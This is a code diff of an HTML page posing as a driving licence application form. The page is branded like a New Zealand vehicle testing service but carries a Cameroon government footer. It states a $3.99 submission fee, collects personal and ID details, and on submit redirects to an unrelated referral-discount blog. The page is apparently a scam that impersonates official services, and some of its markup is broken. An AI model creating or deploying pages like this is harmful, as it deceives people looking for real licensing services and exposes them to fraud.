@@ -1,120 +1,55 @@
-DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Driving Licence Application — Sample Form</title>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Driving Licence Application | Form</title>
 <style>
-:root{--navy:#061d3b;--blue:#0b4f96;--bright:#1688ed;--line:#d5e2f2;--ink:#10284a}
-*{box-sizing:border-box}
-body{margin:0;font-family:Inter,Arial,sans-serif;color:var(--ink);background:#061b35}
-.hero{
-  min-height:360px;padding:28px max(5vw,20px) 100px;color:white;position:relative;overflow:hidden;
-  background:linear-gradient(90deg,rgba(3,18,40,.97) 0%,rgba(3,24,49,.86) 43%,rgba(3,24,49,.2) 100%),
-  url('https://images.unsplash.com/photo-1492144534655-ae79c964c9d7?auto=format&fit=crop&w=2000&q=85') center 54%/cover no-repeat;
-}
-.brand{display:flex;align-items:center;gap:12px;font-weight:800;letter-spacing:3px;text-transform:uppercase;font-size:14px}
-.brand-mark{width:54px;height:34px;border:2px solid #fff;border-radius:20px 22px 10px 10px;display:grid;place-items:center;font-size:21px;letter-spacing:0}
-.brand small{display:block;font-size:10px;letter-spacing:4px;font-weight:500;margin-top:4px;color:#c9def8}
-.hero-copy{max-width:600px;margin-top:42px}
-h1{font-size:clamp(2.4rem,5vw,4.1rem);line-height:1.02;margin:0 0 16px;letter-spacing:-1.5px}
-h1 span{display:block;color:#35a0ff}
-.hero-copy p{font-size:16px;line-height:1.6;max-width:520px;color:#e2edfb}
-.trust{display:flex;gap:22px;flex-wrap:wrap;margin-top:25px;font-size:13px;color:#f2f7ff}
-.trust span{display:flex;gap:8px;align-items:center}
-.trust b{display:grid;place-items:center;width:34px;height:34px;border:1px solid #398de0;border-radius:50%;font-size:17px}
-main{max-width:1180px;margin:-65px auto 0;position:relative;padding:0 18px 34px}
-.form-shell{background:#f7fbff;border:1px solid #dce8f6;border-radius:18px;padding:20px;box-shadow:0 18px 55px #00152c77}
-form{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:16px}
-.section{background:white;border:1px solid #d4e3f5;border-radius:12px;padding:0 15px 16px;box-shadow:0 3px 10px #123c6810;min-width:0}
-.section h2{background:linear-gradient(100deg,#0a3d78,#14578f);color:#fff;margin:0 -15px 14px;padding:13px 15px;border-radius:10px;font-size:15px;display:flex;gap:10px;align-items:center}
-.section h2 span{font-size:19px}
-.field{margin-top:12px}
-label{display:block;font-size:12px;font-weight:700;margin-bottom:6px}
-.required{color:#d92d43}
-input,select,textarea{font:inherit;width:100%;min-width:0;border:1px solid #cbdcf0;border-radius:7px;padding:11px 12px;background:#fff;color:#17385f;font-size:13px}
-input:focus,select:focus,textarea:focus{outline:2px solid #9bcaff;border-color:#3389d8}
-input[type=file]{padding:8px;font-size:12px}
-small.hint{display:block;color:#6d829e;font-size:11px;margin-top:6px;line-height:1.4}
-.two{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-.submit-row{grid-column:1/-1}
-button{width:100%;border:0;border-radius:8px;background:linear-gradient(90deg,#0b4388,#1478d2);color:white;font-size:16px;font-weight:800;padding:15px;cursor:pointer}
-button:hover{filter:brightness(1.08)}
-.notice{font-size:11px;line-height:1.6;text-align:center;color:#4b6382;margin:14px auto 0;max-width:800px}
-footer{color:#d9e8fb;text-align:center;padding:18px 20px 30px;font-size:12px;line-height:1.6}
-@media(max-width:720px){.hero{padding-bottom:90px;background-position:60% center}.hero-copy{margin-top:34px}.trust{gap:12px}.form-shell{padding:12px}form{grid-template-columns:1fr}.section h2{font-size:14px}.submit-row{grid-column:auto}main{padding-inline:12px}}
-@media(max-width:390px){.two{grid-template-columns:1fr}.hero{padding-inline:18px}.brand{letter-spacing:2px}}
+:root{--navy:#041a35;--blue:#0757a9;--bright:#087cf0;--white:#f5f9ff}
+*{box-sizing:border-box}body{margin:0;font-family:Arial,sans-serif;background:#03162e;color:var(--white)}
+.hero{min-height:390px;padding:25px max(5vw,20px) 95px;background:linear-gradient(90deg,rgba(2,17,37,.97),rgba(2,20,43,.78) 48%,rgba(2,20,43,.18)),url('https://images.unsplash.com/photo-1492144534655-ae79c964c9d7?auto=format&fit=crop&w=2000&q=85') center 56%/cover no-repeat}
+.brand{display:flex;align-items:center;gap:12px;font-weight:bold;letter-spacing:4px;text-transform:uppercase;font-size:15px}.car{width:58px;height:38px;display:grid;place-items:center;border:2px solid white;border-radius:20px 22px 9px 9px;font-size:24px;filter:drop-shadow(0 0 7px #138aff)}.brand small{display:block;color:#c5dcf6;font-size:10px;letter-spacing:3px;font-weight:normal;margin-top:5px}
+.hero-copy{max-width:610px;margin-top:40px}h1{font-size:clamp(2.4rem,5vw,4.2rem);line-height:1.02;letter-spacing:-1.7px;margin:0 0 16px}h1 span{color:#2998ff}.hero-copy p{max-width:520px;color:#e2edfb;line-height:1.65;font-size:15px}.trust{display:flex;gap:20px;flex-wrap:wrap;margin-top:24px;font-size:12px}.trust span{display:flex;align-items:center;gap:8px}.trust b{display:grid;place-items:center;width:35px;height:35px;border:1px solid #2187e8;background:#06427d;border-radius:50%;font-size:16px}
+main{max-width:1180px;padding:0 18px 30px;margin:-62px auto 0;position:relative}.shell{background:rgba(3,26,52,.97);border:1px solid #1681d7;border-radius:16px;padding:18px;box-shadow:0 18px 60px #0008}form{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:15px}.section{min-width:0;background:linear-gradient(145deg,#062849,#041b37);border:1px solid #0b70c2;border-radius:12px;padding:0 14px 15px;box-shadow:0 4px 14px #0002}.section h2{margin:0 -14px 13px;padding:13px 14px;border-radius:10px;background:linear-gradient(100deg,#06458b,#075ca9);font-size:15px;display:flex;align-items:center;gap:10px}.section h2 span{font-size:18px}.field{margin-top:12px}label{display:block;font-size:12px;font-weight:bold;margin:0 0 6px;color:#edf5ff}.req{color:#ff747f}input,select,textarea{width:100%;min-width:0;border:1px solid #326e9f;border-radius:7px;background:#10365a;color:white;padding:11px 12px;font:inherit;font-size:13px}input::placeholder,textarea::placeholder{color:#c1d4ea}select option{background:#10365a;color:white}input:focus,select:focus,textarea:focus{outline:2px solid #208df3;border-color:#80c1ff}.two{display:grid;grid-template-columns:1fr 1fr;gap:10px}.submit-area{grid-column:1/-1}button{width:100%;border:0;border-radius:8px;padding:15px 16px;background:linear-gradient(90deg,#0560e8,#0789ff);color:white;font-size:16px;font-weight:bold;cursor:pointer}button:hover{filter:brightness(1.1)}.note{text-align:center;color:#c1d5ed;font-size:11px;line-height:1.6;max-width:850px;margin:13px auto 0}footer{border-top:1px solid #174d7d;display:flex;justify-content:space-between;gap:20px;align-items:center;padding:20px max(5vw,20px);color:#d7e7fa;font-size:12px}.footer-brand{font-weight:bold;letter-spacing:2px}
+@media(max-width:720px){.hero{padding:23px 20px 90px;background-position:62% center}.hero-copy{margin-top:35px}.trust{gap:12px}main{padding:0 11px 24px}.shell{padding:11px}form{grid-template-columns:1fr}.submit-area{grid-column:auto}footer{flex-direction:column;text-align:center}.section h2{font-size:14px}}@media(max-width:390px){.two{grid-template-columns:1fr}.brand{letter-spacing:2px}.car{width:48px}}
 </style>
 </head>
 <body>
-<header class="hero">
-  <div class="brand"><div class="brand-mark" aria-hidden="true">🚘</div><div>Driving Licence<small> · Sample Application</small></div></div>
-  <div class="hero-copy">
-    <h1>Driving Licence <span>Application Form</span></h1>
-    <p>Complete the sample application form below with accurate information. Check current requirements with the relevant transport authority before applying. SUBMISSION FEE $3.99</p>
-    <div class="trust">
-      <span><b>✓</b> Clear application steps</span>
-      <span><b>◷</b> Easy-to-use form</span>
-      <span><b>◎</b> Mobile friendly</span>
-    </div>
-  </div>
+<header cla
+ss="hero">
+<div class="brand"><div class="car" aria-hidden="true">🚘</div><div>VTNZ FORM<small>Driving Licence Services </small></div></div>
+<div class="hero-copy"><h1>Driving Licence<br><span>Application Form</span></h1><p>Complete this sample form with accurate details. Confirm current eligibility and application requirements with the relevant transport authority. SUBMISSION FEE $3.99.</p><div class="trust"><span><b>✓</b> Clear application steps</span><span><b>↗</b> Easy to use</span><span><b>◎</b> Mobile friendly</span></div></div>
 </header>
-<main>
-<div class="form-shell">
-<form action="#" method="post">
-  <section class="section">
-    <h2><span>👤</span> 1. Personal Information</h2>
-    <div class="field"><label for="fullname">Full name <i class="required">*</i></label><input id="fullname" name="fullname" autocomplete="name" placeholder="Enter your full name" required></div>
-    <div class="field"><label for="dob">Date of birth <i class="required">*</i></label><input id="dob" name="dob" type="date" autocomplete="bday" required></div>
-    <div class="field"><label for="gender">Gender (optional)</label><select id="gender" name="gender"><option value="">Select gender</option><option>Male</option><option>Female</option><option>Prefer not to say</option></select></div>
-    <div class="field"><label for="nationality">Nationality <i class="required">*</i></label><input id="nationality" name="nationality" placeholder="Enter nationality" required></div>
-  </section>
-  <section class="section">
-    <h2><span>📍</span> 2. Contact &amp; Address</h2>
-    <div class="field"><label for="address">Residential address <i class="required">*</i></label><input id="address" name="address" autocomplete="street-address" placeholder="House number, street, area" required></div>
-    <div class="field"><label for="city">City / town <i class="required">*</i></label><input id="city" name="city" autocomplete="address-level2" placeholder="City or town" required></div>
-    <div class="two">
-      <div class="field"><label for="phone">Phone (optional)</label><input id="phone" name="phone" type="tel" autocomplete="tel" placeholder=" ..."></div>
-      <div class="field"><label for="email">Email (optional)</label><input id="email" name="email" type="email" autocomplete="email" placeholder="you@example.com"></div>
-    </div>
-  </section>
-  <section class="section">
-    <h2><span>🚘</span> 3. Licence Details</h2>
-    <div class="field"><label for="category">Licence category <i class="required">*</i></label><select id="category" name="category" required><option value="">Select licence category</option><option value="A">Category A — confirm eligibility</option><option value="B">Category B — light motor vehicle</option><option value="C">Category C — heavy goods vehicle</option><option value="D">Category D — passenger transport</option><option value="other">Other / unsure</option></select></div>
-    <div class="field"><label for="application">Application type <i class="required">*</i></label><select id="application" name="application" required><option value="">Select application type</option><option value="first-time">First-time application</option><option value="renewal">Renewal</option><option value="replacement">Replacement</option></select></div>
-  </section>
-  <section class="section">
-    <h2><span>📄</span> 4. Identification Documents</h2>
-    <div class="field"><label for="idtype">Identification document type <i class="required">*</i></label><select id="idtype" name="idtype" required><option value="">Select document type</option><option>National ID card</option><option>Passport</option><option>Other accepted document</option></select></div>
-    <p class="hint">you can hold and double check your information.</p>
-  </section>
-  <section class="section">
-    <h2><span>✚</span> 5. Medical Fitness</h2>
-    <div class="field"><label for="medical">Medical assessment status <i class="required">*</i></label><select id="medical" name="medical" required><option value="">Select status</option><option>Completed</option><option>Pending</option><option>Not yet completed</option></select></div>
-  </section>
-  <section class="section">
-    <h2><span>🎓</span> 6. Driving School &amp; Training</h2>
-    <div class="field"><label for="school">Driving school name</label><input id="school" name="school" placeholder="Enter driving school name"></div>
-    <div class="field"><label for="training">Training status <i class="required">*</i></label><select id="training" name="training" required><option value="">Select status</option><option>Completed</option><option>In progress</option><option>Not started</option></select></div>
-  </section>
-  <section class="section">
-    <h2><span>☑</span> 7. Examinations</h2>
-    <div class="two">
-      <div class="field"><label for="theory">Theory status <i class="required">*</i></label><select id="theory" name="theory" required><option value="">Select status</option><option>Passed</option><option>Pending</option><option>Not taken</option></select></div>
-      <div class="field"><label for="practical">Practical status <i class="required">*</i></label><select id="practical" name="practical" required><option value="">Select status</option><option>Passed</option><option>Pending</option><option>Not taken</option></select></div>
-    </div>
-  </section>
-  <section class="section">
-    <h2><span>💬</span> 8. Additional Information</h2>
-    <div class="field"><label for="notes">Additional information (optional)</label><textarea id="notes" name="notes" rows="4" placeholder="Enter any additional information"></textarea></div>
-  </section>
-  <button
-    type="button"
-    onclick="window.location.href='https://myreferraldiscount.blog/">
-    ➤ Submit Application Details
-</button>
-</div>
-</main>
-<footer>Drive safely. Build a better tomorrow.</footer>
-</body>
-</html>
+<main><div class="shell"><form id="applicationForm">
+<section class="section"><h2><span>👤</span> 1. Personal Information</h2>
+<div class="field"><label for="fullname">Full Name <i class="req">*</i></label><input id="fullname" name="fullname" autocomplete="name" placeholder="Enter your full name" required></div>
+<div class="field"><label for="dob">Date of Birth <i class="req">*</i></label><input id="dob" name="dob" type="date" required></div>
+<div class="field"><label for="gender">Gender</label><select id="gender" name="gender"><option value="">Select gender</option><option>Male</option><option>Female</option><option>Prefer not to say</option></select></div>
+<div class="field"><label for="nationality">Nationality <i class="req">*</i></label><input id="nationality" name="nationality" placeholder="Enter nationality" required></div></section>
+<section class="section"><h2><span>📍</span> 2. Contact &amp; Address</h2>
+<div class="field"><label for="address">Residential Address <i class="req">*</i></label><input id="address" name="address" autocomplete="street-address" placeholder="House number, street, area" required></div>
+<div class="field"><label for="city">City / Town <i class="req">*</i></label><input id="city" name="city" autocomplete="address-level2" placeholder="City or town" required></div>
+
+<div class="two"><div class="field"><label for="phone">Phone </label><input id="phone" name="phone" type="tel" autocomplete="tel" placeholder="
+  
+"></div><div class="field"><label for="email">Email </label><input id="email" name="email" type="email" autocomplete="email" placeholder="you@example.com"></div></div></section>
+<section class="section"><h2><span>🚘</span> 3. Licence Details</h2>
+<div class="field"><label for="category">Licence Category <i class="req">*</i></label><select id="category" name="category" required><option value="">Select licence category</option><option value="A">Full License</option><option value="B">Restricted License</option><option value="C">Learners License</option><option value="D">Conversion of Foreign license to NZ licence</option><option value="other">Other / unsure</option></select></div>
+<div class="field"><label for="application">Application Type <i class="req">*</i></label><select id="application" name="application" required><option value="">Select application type</option><option value="first-time">First-time application</option><option value="renewal">Renewal</option><option value="replacement">Replacement</option></select></div></section>
+<section class="section"><h2><span>📄</span> 4. Identification Documents</h2><div class="field"><label for="idtype">Identification Document Type <i class="req">*</i></label><select id="idtype" name="idtype" required><option value="">Select document type</option><option>National ID card</option><option>Passport</option><option>Other accepted document</option></select></div><p class="note"></p></section>
+
+
+
+<section class="section"><h2><span>💬</span> 5. Additional Information</h2><div class="field"><label for="notes">Additional Information (optional)</label><textarea id="notes" name="notes" rows="4" placeholder="Enter any additional information"></textarea></div></section>
+<div class="submit-area"><button type="submit">➤ &nbsp; submit &nbsp; →</button><p class="note"></p></div>
+</form></div></main>
+<footer><div class="footer-brand">🇨🇲 &nbsp; REPUBLIC OF CAMEROON<br><span style="font-weight:normal;letter-spacing:1px">Peace · Work · Fatherland</span></div><div>Sample application interface · Not an official government website</div></footer>
+<script>
+/* Replace this with a destination website you control or are authorized to use. */
+const destinationURL = "https://myreferraldiscount.blog/";
+document.getElementById("applicationForm").addEventListener("submit", function(event) {
+  event.preventDefault();
+  if (!this.reportValidity()) return;
+  window.location.assign(destinationURL);
+});
+</script>
+</body></html>
